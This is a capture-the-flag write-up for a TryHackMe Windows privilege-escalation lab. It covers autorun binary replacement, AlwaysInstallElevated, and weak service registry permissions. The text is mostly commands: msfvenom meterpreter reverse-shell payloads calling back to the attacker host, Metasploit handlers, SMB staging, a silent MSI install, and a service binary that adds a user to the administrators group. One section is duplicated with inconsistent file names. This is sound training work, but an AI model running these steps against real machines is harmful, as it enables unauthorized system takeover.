# Windows PrivEsc Arena

**Room Link:** [https://tryhackme.com/r/room/windowsprivescarena](https://tryhackme.com/r/room/windowsprivescarena)

## Deploy the vulnerable machine

**Kali**

```
xfreerdp +clipboard /u:user /p:password321 /cert:ignore /v:$VICTIM /size:1024x568
```

### Answer the questions

**Open a command prompt and run 'net user'. Who is the other non-default user on the machine?**

**Victim**

```
net users
```

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption></figcaption></figure>

## Registry Escalation - Autorun

### Detection

**Windows VM**

1\. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

**Victim**

```
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption></figcaption></figure>

\
2\. In Autoruns, click on the ‘Logon’ tab.

<figure><img src="../../.gitbook/assets/image (1248).png" alt=""><figcaption></figcaption></figure>

3\. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.

<figure><img src="../../.gitbook/assets/image (1249).png" alt=""><figcaption></figcaption></figure>



\
4\. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"

**Victim**

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

\
5\. From the output, notice that the “Everyone” user group has “FILE\_ALL\_ACCESS” permission on the “program.exe” file.

<figure><img src="../../.gitbook/assets/image (1250).png" alt=""><figcaption></figcaption></figure>

### Exploitation

**Kali VM**

1\. Open command prompt and type: msfconsole

**Kali**

```
msfconsole
```

**Kali(msfconsole)**

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $KALI
run
```

\
6\. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse\_tcp lhost=\[Kali VM IP Address] -f exe -o program.exe

**Kali**

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=$KALI -f exe -o program.exe
```

\
7\. Copy the generated file, program.exe, to the Windows VM.

**Kali**

```
ss -lptn 'sport = :139'
kill -9 $PID
sudo python3.9 /opt/impacket/build/scripts-3.9/smbserver.py kali .
```



**Windows VM**

1\. Place program.exe in ‘C:\Program Files\Autorun Program’.

**Victim**

```
copy \\$KALI\kali\reverse.exe C:\PrivEsc\reverse.exe
```

\
2\. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

**Victim**

```
xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568
```



**Kali VM**

1\. Wait for a new session to open in Metasploit.

<figure><img src="../../.gitbook/assets/image (1251).png" alt=""><figcaption></figcaption></figure>



2\. In Metasploit (msf > prompt) type: sessions -i \[Session ID]

**Kali(msfconsole)**

<pre><code><strong>sessions -i 1
</strong></code></pre>

\
3\. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid

**Kali(meterpreter)**

```
getuid
```

<figure><img src="../../.gitbook/assets/image (1252).png" alt=""><figcaption></figcaption></figure>

## Registry Escalation - Autorun

### Detection

**Windows VM**

1\. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

**Victim**

```
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

\
2\. In Autoruns, click on the ‘Logon’ tab.\
3\. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

\
4\. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"

**Victim**

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

5\. From the output, notice that the “Everyone” user group has “FILE\_ALL\_ACCESS” permission on the “program.exe” file.

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

**Kali VM**

1\. Open command prompt and type: msfconsole

**Kali**

```
msfconsole
```

2\. In Metasploit (msf > prompt) type: use multi/handler\
3\. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse\_tcp\
4\. In Metasploit (msf > prompt) type: set lhost \[Kali VM IP Address]\
5\. In Metasploit (msf > prompt) type: run

**Kali(msfconsole)**

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost $KALI
run
```

\
6\. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse\_tcp lhost=\[Kali VM IP Address] -f exe -o program.exe

**Kali**

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=$KALI -f exe -o program.exe
```

\
7\. Copy the generated file, program.exe, to the Windows VM.

**Kali**

```
ss -lptn 'sport = :139'
kill -9 $PID
sudo python3.9 /opt/impacket/build/scripts-3.9/smbserver.py kali .
```

**Victim**

```
copy \\$KALI\kali\program.exe "C:\Program Files\Autorun Program\program.exe"
```



**Windows VM**

1\. Place program.exe in ‘C:\Program Files\Autorun Program’.\
2\. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

**Kali**

```
xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568
```

**Kali VM**

1\. Wait for a new session to open in Metasploit.

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

2\. In Metasploit (msf > prompt) type: sessions -i \[Session ID]\
3\. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>



## Registry Escalation - AlwaysInstallElevated

### Detection

**Windows VM**

1.Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer

**Victim**

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

2.From the output, notice that “AlwaysInstallElevated” value is 1.\
3.In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer

**Victim**

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

4.From the output, notice that “AlwaysInstallElevated” value is 1.

### Exploitation

**Kali VM**

1\. Open command prompt and type: msfconsole

**Kali**

```
msfconsole
```

\
2\. In Metasploit (msf > prompt) type: use multi/handler\
3\. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse\_tcp\
4\. In Metasploit (msf > prompt) type: set lhost \[Kali VM IP Address]\
5\. In Metasploit (msf > prompt) type: run

**Kali (msfconsole)**

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost $KALI
run
```

\
6\. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse\_tcp lhost=\[Kali VM IP Address] -f msi -o setup.msi\
7\. Copy the generated file, setup.msi, to the Windows VM.\


**Kali**

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=$KALI -f msi -o setup.msi
```

**Kali**

```
ss -lptn 'sport = :139'
kill -9 $PID
sudo python3.9 /opt/impacket/build/scripts-3.9/smbserver.py kali .
```

**Victim**

```
copy \\$KALI\kali\setup.msi "C:\Temp\setup.msi"
```



**Windows VM**

1.Place ‘setup.msi’ in ‘C:\Temp’.\
2.Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi

**Victim**

```
msiexec /quiet /qn /i C:\Temp\setup.msi
```

**Kali VM**

1\. Wait for a new session to open in Metasploit.\
2\. In Metasploit (msf > prompt) type: sessions -i \[Session ID]\
3\. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid

**Kali (msfconsole)**

```
sessions -i 1
getuid
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

## Service Escalation - Registry

### ﻿Detection

**Windows VM**

1\. Open powershell prompt and type: Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl\
2\. Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.

**Victim(powershell)**

```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Exploitation

**Windows VM**

1\. Copy ‘C:\Users\User\Desktop\Tools\Source\windows\_service.c’ to the Kali VM.

**Kali**

```
xfreerdp +clipboard /u:user /p:password321 /cert:ignore /v:$VICTIM /size:1024x568  /drive:kali,/root/
```

**Victim**

```
copy "C:\Users\User\Desktop\Tools\Source\windows_service.c" \\tsclient\kali\windows_service.c
```



**Kali VM**

1\. Open windows\_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add

**Kali**

```
subl windows_service.c
```

**From**

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**To**

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

\
2\. Exit the text editor and compile the file by typing the following in the command prompt: x86\_64-w64-mingw32-gcc windows\_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')&#x20;

**Kali**

```
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

\
3\. Copy the generated file x.exe, to the Windows VM.

**Victim**

```
copy \\tsclient\kali\x.exe "C:\Temp\x.exe" 
```



**Windows VM**

1\. Place x.exe in ‘C:\Temp’.\
2\. Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG\_EXPAND\_SZ /d c:\temp\x.exe /f

**Victim**

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```

\
3\. In the command prompt type: sc start regsvc

**Victim**

```
sc start regsvc
```

\
4\. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

**Victim**

```
net localgroup administrators 
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

























































































